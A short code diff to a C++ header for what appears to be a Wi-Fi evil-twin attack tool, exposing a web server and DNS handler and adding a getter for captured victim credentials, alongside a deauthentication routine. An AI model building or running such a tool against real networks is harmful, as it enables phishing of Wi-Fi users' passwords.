@@ -27,14 +27,16 @@ public:
     void stop();
     
     void setSelectedPortal(const std::string& portalName);
+    void startWebServer();
+    void processDns(); // <-- ADD THIS
 
     bool isActive() const;
     bool isAttackPending() const;
     const WifiNetworkInfo& getTargetNetwork() const;
     int getVictimCount() const;
+    const std::vector<VictimCredentials>& getCapturedCredentials() const; // <-- ADD THIS GETTER
 
 private:
-    void startWebServer();
     void deauthRoutine();
     
     // Web server handlers
